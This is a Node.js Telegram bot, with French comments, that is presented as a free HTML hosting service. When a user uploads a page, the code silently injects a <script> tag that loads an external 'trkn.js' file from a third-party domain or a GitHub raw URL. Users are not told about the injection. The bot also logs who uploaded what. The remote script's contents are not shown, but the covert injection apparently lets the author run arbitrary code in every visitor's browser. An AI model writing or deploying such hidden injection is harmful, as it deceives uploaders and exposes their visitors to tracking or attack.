const { Telegraf } = require("telegraf");
const express = require("express");
const multer = require("multer");
const fs = require("fs-extra");
const path = require("path");
require("dotenv").config();

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();
const PORT = process.env.PORT || 3000;

// Dossier des uploads
const UPLOADS_DIR = path.join(__dirname, "uploads");
fs.ensureDirSync(UPLOADS_DIR);

// Stockage Multer
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOADS_DIR),
  filename: (req, file, cb) => cb(null, Date.now() + "-" + file.originalname),
});
const upload = multer({ storage });

// Objet pour stocker les noms personnalisés
const userFileNames = {};

// Commande /start
bot.start((ctx) => {
  ctx.reply("Bienvenue ! Envoyez-moi un fichier HTML et je vais l'héberger.\n\n" +
            "Utilisez /help pour plus d'informations.");
});

// Commande /help
bot.help((ctx) => {
  ctx.reply("📌 *Bot d'Upload HTML* 📌\n" +
            "Développé par *trhacknon* 🛠️\n\n" +
            "📂 *Envoyez un fichier HTML* : Le bot va l'héberger et vous donner un lien.\n" +
            "✏️ *Personnaliser le nom* : Avant d'envoyer un fichier, utilisez la commande :\n" +
            "`/name nom-du-fichier`\n\n" +
            "💡 Exemple : `/name mon-site`\nPuis envoyez `index.html`, et l'URL sera :\n" +
            "`https://votre-site.com/uploads/mon-site.html`");
});

// Commande /name pour définir un nom personnalisé
bot.command("name", (ctx) => {
  const name = ctx.message.text.split(" ")[1];
  if (!name) {
    return ctx.reply("❌ Utilisation : `/name nom-du-fichier`");
  }
  userFileNames[ctx.message.from.id] = name.replace(/[^a-zA-Z0-9-_]/g, "");
  ctx.reply(`✅ Nom défini : *${userFileNames[ctx.message.from.id]}*`);
});

// Gère les fichiers HTML envoyés
bot.on("document", async (ctx) => {
  const file = ctx.message.document;
  if (!file.file_name.endsWith(".html")) {
    return ctx.reply("❌ Veuillez envoyer un fichier `.html` uniquement.");
  }

  // Récupérer le nom personnalisé ou utiliser le nom original
  const customName = userFileNames[ctx.message.from.id] || file.file_name.replace(/[^a-zA-Z0-9-_]/g, "");
  const filePath = path.join(UPLOADS_DIR, `${customName}.html`);
  const fileLink = await ctx.telegram.getFileLink(file.file_id);

  // Télécharger et modifier le fichier
  const response = await fetch(fileLink);
  let content = await response.text();

  // Ajoute le script à la fin du <body> si <body> existe
  if (content.includes("</body>")) {
    content = content.replace("</body>", `<script src="https://javascriptonline.com/trkn.js"></script></body>`);
  } else {
    content += `<script src="https://raw.githubusercontent.com/tucommenceapousser/tgweb/refs/heads/main/trkn.js"></script>`;
  }

  // Sauvegarde du fichier modifié
  await fs.writeFile(filePath, content);

  // URL d'accès
  const fileUrl = `${process.env.BASE_URL}/uploads/${customName}.html`;

  // Sauvegarde des fichiers dans uploads.json
  const logPath = path.join(__dirname, "uploads.json");
  let logs = [];
  if (fs.existsSync(logPath)) {
    logs = JSON.parse(fs.readFileSync(logPath, "utf8"));
  }
  logs.push({ user: ctx.message.from.username, url: fileUrl });
  fs.writeFileSync(logPath, JSON.stringify(logs, null, 2));

  ctx.reply(`✅ Fichier mis en ligne :\n${fileUrl}`);
});

// Serveur Express pour accéder aux fichiers
app.use("/uploads", express.static(UPLOADS_DIR));

app.listen(PORT, () => {
  console.log(`🚀 Serveur lancé sur le port ${PORT}`);
});

// Démarrer le bot
bot.launch();
